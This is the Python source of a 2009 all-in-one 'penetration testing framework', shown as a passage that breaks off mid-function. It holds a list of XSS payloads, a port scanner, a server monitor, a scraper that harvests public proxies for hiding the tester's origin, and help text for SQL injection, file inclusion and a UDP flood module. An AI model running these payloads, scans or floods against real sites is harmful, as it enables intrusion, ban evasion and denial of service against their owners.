#!/usr/bin/python


from time import *
import socket,os,sys
import time, re, datetime,httplib,urllib2
a = 'None' 
b = 'None' 
c = 'None' 
d = 'None' 
e = 'None' 
f = 'None' 
g = 'None' 
h = 'None' 
i = 'None' 
j = 'None' 
k = 'None'
alert= "ashikali%2D1208%2DY0U"
jense = '0'
myip = 0
an = 0
pls = 0
anony = 0
bol = 0
bikimiki = '0'
ashikali1208 = '0'
jamrukh='0'
dadam='0'
salmanali = '0'


xss_payloads = ["%22%3E%3Cscript%3Ealert%28%27"+alert+"%27%29%3C%2Fscript%3E",
		"%22%3E<IMG SRC=\"javascript:alert(%27"+alert+"%27);\">",
		"%22%3E<script>alert(String.fromCharCode(68,51,72,89,68,82,56,45,48,119,78,122,45,89,48,85));</script>",
		"'';!--\"<%27"+alert+"%27>=&{()}",
		"';alert(0)//\';alert(1)//%22;alert(2)//\%22;alert(3)//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(%27"+alert+"%27)%3C/SCRIPT%3E=&{}%22);}alert(6);function",
		"</textarea><script>alert(%27"+alert+"%27)</script>"]

def banalls():
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t#################################################"
	print "\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #" 
	print "\t\t#    Copyright (C) 2009 By Ashikali             #"
	print "\t\t#    All SCAN                                   #" 
	print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
	print "\t\t#    www.Ashikali.com                           #" 
	print "\t\t#    GNU General Public License                 #"
	print "\t\t#################################################"


def bansql():
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t#################################################"
	print "\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #" 
	print "\t\t#    Copyright (C) 2009 By Ashikali             #"
	print "\t\t#    SQL INJECTION SCANNAR                      #" 
	print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
	print "\t\t#    www.Ashikali.com                           #" 
	print "\t\t#    GNU General Public License                 #"
	print "\t\t#################################################"
	
def banbli():
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t#################################################"
	print "\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #" 
	print "\t\t#    Copyright (C) 2009 By Ashikali             #"
	print "\t\t#    BLIND INJECTION SCANNAR                    #" 
	print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
	print "\t\t#    www.Ashikali.com                           #" 
	print "\t\t#    GNU General Public License                 #"
	print "\t\t#################################################"

def banlfi():
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t#################################################"
	print "\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #" 
	print "\t\t#    Copyright (C) 2009 By Ashikali             #"
	print "\t\t#    LOCAL FILE Inclusion SCANNAR               #" 
	print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
	print "\t\t#    www.Ashikali.com                           #" 
	print "\t\t#    GNU General Public License                 #"
	print "\t\t#################################################"

def banrfi():
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t#################################################"
	print "\t\t#    PENETRATION TESTING FRAMEWORK FOR CELNET   #" 
	print "\t\t#    Copyright (C) 2009 By Ashikali             #"
	print "\t\t#    REMOTE FILE INCLUSION SCANNAR              #" 
	print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
	print "\t\t#    www.Ashikali.com                           #" 
	print "\t\t#    GNU General Public License                 #"
	print "\t\t#################################################"
	
def hlpptoxy():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of Proxy Setting"
	print "\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\t\t\t----------------------------------"
	print "\n\tIf You Want To Penetrate The Target Via Proxy Or If You Are Using Internet Connection Via Proxy Then You Can Use This Part. Many Website And Network Use The IP Banning System This Time Hackers Are Use Socks For Hiding Their Activity. Even If The Target Blocks The One IP Then Hackers Can Change The Socks. In Penetration Testing This Module Can Be Very Helpful To Enumerate And Analysis Of IP Banning Function."
	print "\n\t\t\t\t  Tools Information"
	print "\t\t\t----------------------------------"
	print "\t\nThis Part COVERD Two Tools. First Will Search The Proxy From Internet & Second Tool Will Checking The Proxy For Whether Its Alive Or Dead. Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples, Working Flow Etc..."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpservertask():

	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t     Wellcome To Help Section Of web server task"
	print "\n****************************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tBy this modual you can enumarate the web server located on internet or in intranetwork. this task can be perform without to any types of intrection of the target computer"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tAlthough this task require the ip address and the website name of the target. each task has its own help included. you can penetrate the webserver coneneusly and very silently by this task."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpweb():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n     Wellcome To Help Section Of Evaluateing Web Appication Vulnerablity"
	print "\n****************************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Module Will Give The Information Of Web Application Vulnerability After Gathering Information Always Good Penetration Tester Will Scan The Target For Getting The Information.  This Tool Scans The Same Vulnerability Which Can Be Easily Exploited By The Malicious Hacker."
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Part COVERD Scanning SQL Injection, Remote File Inclusion, Local File Inclusion, Cross Site Scripting, Dork Scanning. This Module Is Purely Referred To Analyze The Web Application Vulnerability Each Module Has Own Help Option Included So You Can Get Help Such As Syntax, Examples... Working Flow Etc."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpps():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t     Wellcome To Help Section Of Proxy Spider"
	print "\n****************************************************************************"
	print "\n\t\t\t\tGeneral information"
	print "\n\t\t\t----------------------------------"
	print "\n\tBy This Modual You Can Gether Diffrent Types Of proxy its will gather CGI, TRANSPARANT, SOCK4 AND SOCK5 proxy for your penetration. "
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\t this function is very easy to use just press 1 and start the process. after certain minutes its will store all gathered proxy in PROXYLIST.TXT file in same folder where the rpt is exist."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlptest():

	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t     Wellcome To Help Section Of Proxy Testing"
	print "\n****************************************************************************"
	print "\n\t\t\t\tGeneral information"
	print "\n\t\t\t----------------------------------"
	print "\n\tBy This Modual You Can Check The Proxy Weather Its Alive Or Not. this function will test the responce by sending syn packet to the proxy. "
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\t very easy to use just press 1 for conteneue the operation and enter proxy file name. you can give proxylist.txt which you have created by proxy spider function and its will save all alive proxy in proxyalive.txt file"
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpserver():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\tWellcome To Help Section Of webserver host name enumeration  "
	print "\n\t\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tthis module will test the server for its host name by sending http get request. you can gether the web servers fully qulified host name from ip range."
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tfor use this function u must have to enter ip range by this formates only E.G 127.0.0.1-255. this will scan 127.0.0.1 to 127.0.0.255 all host and its will give you host name of each ip"
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpmono():

	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\tWellcome To Help Section Of webserver monitoring  "
	print "\n\t\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis Modual will monitor the entire server. its will log the all activity if its seems any changes. you should perform this task during the penetration testing."
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tFor use this function you must have the server ip address or the web site address"
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	


def hlpserverid():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of webserver identifier  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThis module will test the perticular server for its service this task will give many information about the server like the version no and many more. entire information will be store in file which you have given "
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tFor use this task you must have to enter only website for example www.[site].com. its not nacessory to enter http:// or https:// before the site the tool will start the testing."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	


def hlpserverservi():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\tWellcome To Help Section Of webserver Service Enumeration  "
	print "\n\t\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tthis module will test the server for its host name by sending http get request. you can gether the web servers service and its version from ip range."
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tfor use this function u must have to enter ip range by this formates only E.G 127.0.0.1-255. this will scan 127.0.0.1 to 127.0.0.255 all host and its will give you service name and version of each ip"
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpmain():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t     Wellcome To Help Section Of RPT V 1.0"
	print "\n****************************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThe Pure Penetration testing is to enumerate the target by various methodology. by remote penetration you can perform same task its has many task included. but the penetration system must folliw the propar sequence"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThe SERVER TASK will scan the webserver by various methods and the application will scan the webapplication. as we know that every web application has located on web server so for geting acurate penetration result first use webserver scan before to perform web application testing task. every function has included its own help"
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpport():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t     Wellcome To Help Section Of Port Scanning"
	print "\n****************************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tIn penetration testing process the ports are most important helpful things to identify security risk. by this function you can fulfil the penetration task. this function will report each open port of the target system."
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tFirst you need to enter website name or its ip address and then enter starting port number and ending port number for E.G www.[site].com and starting port 80, ending port 110, then its will give you the open port between 80 to 110 range of target www.[site].com"
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")

def hlpsqli():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t     Wellcome To Help Section Of SQL INJECTION"
	print "\n****************************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThe sql injection is the method to forge the query. by this methods its posible to enumerate entire database without any authentication. by this tool you can remove both informative and logical vulnarablity. this tool will report each vulnarable link to you"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tTo perform this task you have to enter only website address or the ip address. its not nessasory to incude http:// or https:// before site name."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpblind():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t     Wellcome To Help Section Of BLIND INJECTION"
	print "\n****************************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThe blind injection is the same but more advance method then SQL Injection to forge the query. by this methods its posible to enumerate entire database without any authentication. by this tool you can remove both informative and logical vulnarablity. this tool will report each vulnarable link to you"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tTo perform this task you have to enter only website address or the ip address. its not nessasory to incude http:// or https:// before site name."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlplfi():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t     Wellcome To Help Section Of LFI"
	print "\n****************************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tThe LFI (Local File Includation) is undesclose methods to acsess the restricted file from web application. this task will report each link which can be use for acsess the restricted file. this types of files contain credinsial information such as user name and passwords"
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tTo perform this task you have to enter only website address or the ip address. its not nessasory to incude http:// or https:// before site name."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpcgi():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t     Wellcome To Help Section Of LOGICAL TESTING (CGI)"
	print "\n****************************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tFor Testing logical vulnareblity from web application you can perform this task. this scanning has more then 16500 payload loded. using this task u can recive responce of each payloads."
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tTo perform this task you have to enter only website address or the ip address. its not nessasory to incude http:// or https:// before site name."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def hlpxss():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t\t     Wellcome To Help Section Of XSS TESTING"
	print "\n****************************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tcross site scripting is mostly occure in search field this function will enumerate entire sites and its will find the vulnarablity."
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tTo perform this task you have to enter only website address or the ip address. its not nessasory to incude http:// or https:// before site name. after its will ask you to enter port number. if site work on http then use 80 or if site use https then use 445."
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	


def hlpdos():
	
	if os.name == "posix":
		# Unix/Linux/MacOS/BSD/etc
		os.system('clear')
	elif os.name in ("nt", "dos", "ce"):
		# DOS/Windows
		os.system('CLS')
	print "\n\t             Wellcome To Help Section Of bandwidth Testing  "
	print "\n\t************************************************************"
	print "\n\t\t\t\tGeneral Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tFor Testing The Bandwidth of the target web server the rpt has unique tools. by this tool you can estimate the user and request size. actuly this tool will send multiple request on target webserver using undestroyeble high size udp packets."
	print "\n\t\t\t\t  Tools Information"
	print "\n\t\t\t----------------------------------"
	print "\n\tFor use this task you can enter the website name or its ip. remember once you perform this task its will not stop you must have to close entire application"
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

def proxch1():

	#!/usr/bin/python

	import sys, os, urllib, urllib2, re, httplib, sets, socket
	from time import time, localtime, strftime
	from socket import gethostbyaddr

	nogeoip = 0
	try:
		import GeoIP
	except:
		nogeoip = 1
		print "\nGeoIP Module/Database NOT found, try:"
		print "sudo apt-get install libgeoip1 && sudo apt-get install python-geoip"
		print "or visit www[.]maxmind[.]com for download"
		print "GeoIP is not required but highly recommended!\n"
	print "\n\nPlease Be Relex Tool Is Started To Perform Ckeck Proxylist.txt Aftrer Complete \n\n"
	output = 'proxylist.txt'
	sleeptimer = 3
	socket.setdefaulttimeout(10)
	alivelist = []
	myipadress = urllib.urlopen('http://www.whatismyip.com/automation/n09230945.asp').read()
	anon_list = []
	trans_list = []
	planetlab = []

	sites = ['http://www.1proxyfree.com/', 
		 'http://www.atomintersoft.com/products/alive-proxy/socks5-list/',
		 'http://www.proxylist.net/',
		 'http://www.proxylists.net/http_highanon.txt']

	def StripTags(text):
		return re.sub(r'<[^>]*?>','', text)

	def timer():
		now = strftime('%H:%M:%S-%d/%b/%Y', localtime())
		return now

	def ipcheck(proxy):
		try:
			pxhandle = urllib2.ProxyHandler({"http": proxy})
			opener = urllib2.build_opener(pxhandle)
			urllib2.install_opener(opener)
			myip = urllib2.urlopen('http://www.whatismyip.com/automation/n09230945.asp').read()
			xs =  re.findall(('\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}'), StripTags(myip))
			if xs[0] == myipadress or myipadress == myip:
				trans_list.append(proxy)
				print proxy[:-1],"\t- ALIVE -", timer(), "- TRANSPARENT"
			elif xs == None:
				pass
			else:
				anon_list.append(proxy)
				print proxy[:-1],"\t- ALIVE -", timer(), "- EXT-iP :",xs[0]
		except KeyboardInterrupt:
			print "\n\nCTRL+C - check temporary proxylist file\n\n"
			sys.exit(0)
		except:
			pass

	def proxyvalidator(proxylist):
	        finalcount = 0
		for proxy in proxylist:
			proxy.replace('\n', '')
			try:
				proxies = {'http': "http://"+proxy[:-1]}
				opener = urllib.FancyURLopener(proxies)
				try:
					loopchk = opener.open("http://www.google.com").read()
				except:
					pass
			except(IOError,socket.timeout), detail: 
				pass
			ipcheck(proxy)		
			alivelist.append(proxy)
			finalcount += 1
		return alivelist

	def getsamairdotru():
		counter = 1
		pxycnt = 0
		maxpages = 10
		urls = []
		pfile = file(output, 'a')
		while counter <= maxpages:
			if counter < 10: # workaround for page-01 to page-09
				opener = urllib2.build_opener()
				opener.addheaders = [('User-agent', 'Mozilla/5.0')]
				url = opener.open('http://www.samair.ru/proxy/proxy-0'+repr(counter)+'.htm').read()
			else:
				opener = urllib2.build_opener()
				opener.addheaders = [('User-agent', 'Mozilla/5.0')]
				url = opener.open('http://www.samair.ru/proxy/proxy-'+repr(counter)+'.htm').read()
			strings = re.findall(('\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}:\d{1,5}'), StripTags(url))
			for string in strings:
				pfile.write(string+"\n")
				pxycnt = pxycnt+1
			counter = counter+1		
			opener.close()
		print pxycnt, "\t: Proxies received from : http://www.samair.ru/proxy/"
		pfile.close()

	def getsinglesitelist(site):
	        pxycnt = 0
	        urls = []
	        pfile = file(output, 'a')
	        opener = urllib2.build_opener()
	        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
	        url = opener.open(site).read()
	        strings = re.findall(('\d{1,3}[.]\d{1,3}[.]\d{1,3}[.]\d{1,3}[:]\d{1,5}'), StripTags(url))
	        for string in strings:
			pfile.write(string+"\n")
	                pxycnt = pxycnt+1
		print pxycnt, "\t: Proxies recieved from :", site.split("//",3)[1]
	        opener.close()
	        pfile.close()

	def getplanetlabs():
		opener = urllib2.build_opener()
	        url = opener.open('http://fall.cs.princeton.edu/codeen/tabulator.cgi?table=table_all').read()
		strings = re.findall(('\d{1,3}[.]\d{1,3}[.]\d{1,3}[.]\d{1,3}'), StripTags(url))
		for string in strings:
			planetlab.append(string)
		print len(planetlab), "\t: PlanetLab Proxylist Loaded", "\n"

	def cleanup():
		pfile = open(output, 'r').readlines()
		outfile = file(output, 'w')
		sorted = []
		finalcount = 0
		psremove = 0
		for proxy in pfile:
			if proxy.split(':',1)[0] not in planetlab:
				if proxy not in sorted:
					sorted.append(proxy)
					outfile.write(proxy)
					finalcount += 1
			if proxy.split(':',1)[0] in planetlab:
				psremove += 1
		print "\n", psremove, "\t: PlanetLab (CoDeen) Proxies removed!"
		print finalcount,"\t: unique Proxies found\n"
		print "[+]Testing Proxy"
		outfile.close()

	def fileConst():
		fileC = open(output, 'w')
		falive = []
		fileC.write('+ This List has been generated with proxyharvest_1.1.py // www.darkc0de.com\n')
		fileC.write('+ ANONYMOUS PROXIES\n\n')
		for anon in anon_list:
			fileC.write(anon)
			if anon in alivelist:
				alivelist.remove(anon)
	        fileC.write('\n\n+ TRANSPARENT PROXIES\n\n')
	        for trans in trans_list:
	                fileC.write(trans)
			if trans in alivelist:
				alivelist.remove(trans)
		fileC.write('\n\n+ WORKING BUT UNCLEAR PROXIES\n\n')
		alivelist.sort()
		for alive in alivelist:
			fileC.write(alive)
		fileC.close()	


	print "IP:", myipadress, "//", timer(), "\n"
	getplanetlabs()
	
	for site in sites:
		try:
			getsinglesitelist(site)
		except:
			print "Error   :", site
	
	proxylist = open(output, 'r').readlines()
	proxyvalidator(proxylist)


def proxtes():
	
	import sys, urllib, socket
	socket.setdefaulttimeout(5) #Set your socket timeout here.
	
	def main(proxy):
		
		try:# make a http HEAD request
			proxies = {'http': "http://"+proxy[:-1]}
			opener = urllib.FancyURLopener(proxies)
			opener.open("http://www.python.org")
			print "\t[+] Alive"
		except(IOError), msg: 
			print "\t[-] Dead"
				
			pass


	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  PROXY TESTER                              #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tRoot@RPT")	
		if cho == '2':
			hlptest()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS') 
			ashud=raw_input("\n\t\tEnter The File Name Here : ")
			verbose = 1
	
			try:
				lines = open(ashud, "r").readlines()
				print "\n[+] Proxies loaded:",len(lines)
				try:
					if verbose == 1:
						print "[+] Verbose Mode On\n"
				except(NameError):
					print "[-] Verbose Mode Off\n"
					verbose = 0
					pass
			except(IOError): 
 				print "Error: Check your file path.\n" 
				sys.exit(1)
	
			for proxy in lines:
				print "[+] Testing:",proxy[:-1]
				main(proxy)
			print "\n[-] Done\n"
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")



def oppor():

	#!/usr/bin/python

	import socket as sk
	import sys
	import threading

	MAX_THREADS = 50
	ashu=raw_input("\n\tEnter The Target Website Here : ")
	sal=input("\n\tEnter The Starting Port Here : ")
	bal=input("\n\tEnter The Ending Port Here : ")
	print "\n\n\t[+] Port Scanning Is Started"
	class Scanner(threading.Thread):
	    def __init__(self, host, port):
	        threading.Thread.__init__(self)
	        # host and port
	        self.host = host
	        self.port = port
	        # build up the socket obj
	        self.sd = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
	
	    def run(self):
	        try:
	            # connect to the given host:port
	            self.sd.connect((self.host, self.port))	
	            print "\n\thttp://%s:%d OPEN" % (self.host, self.port)
        	    self.sd.close()
	        except: pass

	class pyScan:
	    def __init__(self, args=[]):
	        self.args = args
	        self.start, self.stop = 1, 1024
	        self.host = ""
		self.start = int(sal)
	        self.stop = int(bal)
	        self.host = ashu
	        try:
	            sk.gethostbyname(self.host)
	        except:
	            print "hostname '%s' unknown" % self.host
	        self.scan(self.host, self.start, self.stop)

	    def scan(self, host, start, stop):
	        self.port = start
	        while self.port <= stop:
	            while threading.activeCount() < MAX_THREADS:
	                Scanner(host, self.port).start()
	                self.port += 1
	        
	if __name__ == "__main__":
	    pyScan(sys.argv)
	sending_back_to_Vilage=raw_input("")	



def webeye():

	import httplib, socket, time, re, os, sys, datetime 
	cho ='0'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##############################################"
		print "\t\t#  PENETRATION TESTING FRAMEWORK FOR CELNET  #" 
		print "\t\t#  Copyright (C) 2009 By Ashikali            #"
		print "\t\t#  WEB SERVER SPIDER                         #" 
		print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
		print "\t\t#  www.Ashikali.com                          #" 
		print "\t\t#  GNU General Public License                #"
		print "\t\t##############################################"
		print "\n\t\tEnter 1 For For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tRoot@RPT ")	
		if cho == '2':
			hlpmono()	
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS') 
			url = raw_input("\n\tEnter Target : ") 
			http = "http://" 
 
			if http in url: 
				print 
				print "ERROR! Remove http:// from the URL." 
				
 
			count = 0 
 
			while 1: 
  
				count = count + 1 
 	
				getdate = datetime.datetime.today() 
				today = getdate.strftime("%d/%m/%Y %H:%M:%S") 
 
			
				socket.setdefaulttimeout(15) 
 
				 
				conn = httplib.HTTPConnection(url, 80) 
 
				try: conn.request("HEAD", "/") 
				except socket.timeout: 
					print "Webserver has timed out. Check URL and internet connection." 
 
				
				res = conn.getresponse() 
		 
				
				conn.close() 
 
				
				ip = socket.gethostbyname(url) 
				server = res.getheader('Server') 
				xpoweredby = res.getheader('x-powered-by') 
				date = res.getheader('date') 
	 
				print "\n\tWeb Monitoring Is Started"
 				print "\n"
				if xpoweredby == None: 
					print ip + " " + server + " " + date 
				else: 
					print ip + " " + server + " " + xpoweredby + " " + date 
 
				print 
				print "The script has run", count, "time/s." 
 
				if (count < 2): 
 
					
					outfile = file('log.txt', 'w') 
					outfile.write("Started on " + today + "\n") 
					outfile.write(ip + " ") 
					outfile.write(server + " ") 
 
					if xpoweredby != None: 
						outfile.write(xpoweredby + " ") 
						outfile.write(date + "\n") 
						outfile.close() 
					else: 
						outfile.write(date + "\n") 
						outfile.close() 
 
				
					print 
					print "Logged!" 
					print 
				else: 
 
					
					readfile = open('log.txt', "r") 
					text = readfile.read() 
 
					if ip not in text: 
						outfile = file('log.txt', 'a') 
						outfile.write('IP address has been changed! New IP is ' + ip + ' ' + date + '\n') 
						outfile.close() 
 
					if server not in text: 
						outfile = file('log.txt', 'a') 
						outfile.write('Web Server software has been changed! New server is ' + server + ' ' + date + '\n') 
						outfile.close() 
 
					if xpoweredby != None and xpoweredby not in text: 
						outfile = file('log.txt', 'a') 
						outfile.write('X-powered-by header has been changed! New header is ' + xpoweredby + ' ' + date + '\n') 
						outfile.close() 
 	
				try: time.sleep(3600) 
				except KeyboardInterrupt: 
						outfile = file('log.txt', 'a') 
						outfile.write("Finished on " + today) 
						outfile.close() 
						print 
						print "Check log.txt." 
						print 
						sys.exit() 
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Syntax")


def subserch():

	import sys, socket

	def getips(ip_range):
		
		lst = []
		iplist = []
		ip_range = ip_range.rsplit(".",2)
		if len(ip_range[1].split("-",1)) ==2:
			for i in range(int(ip_range[1].split("-",1)[0]),int(ip_range[1].split("-",1)[1])+1,1):
				lst.append(ip_range[0]+"."+str(i)+".")
